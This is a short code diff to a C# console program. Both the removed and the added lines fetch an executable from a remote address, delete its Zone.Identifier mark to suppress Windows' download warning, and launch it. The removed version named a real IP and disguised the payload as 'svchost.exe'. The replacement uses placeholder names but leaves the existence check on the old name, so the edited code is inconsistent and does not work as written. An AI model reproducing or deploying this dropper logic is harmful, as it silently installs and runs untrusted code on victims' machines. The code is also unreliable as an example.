@@ -37,15 +37,15 @@ namespace ConsoleApplication3
                 {
                     //
                     //
-                    new WebClient().DownloadFile("http://195.62.53.137/svchost.exe", path + "//" + "svchost.exe");
+                    new WebClient().DownloadFile("http://url/file.exe", path + "//" + "nameoffile.exe");
                     if (File.Exists(path + "//" + "svchost.exe") == true)
                     {
                         try
                         {
-                            DeleteFileW(path + "//" + "svchost.exe" + ":Zone.Identifier");
+                            DeleteFileW(path + "//" + "nameoffile.exe" + ":Zone.Identifier");
                         }
                         catch { }
-                        Process.Start(path + "//" + "svchost.exe");
+                        Process.Start(path + "//" + "nameoffile.exe");
                     }
                 }
                 catch { }
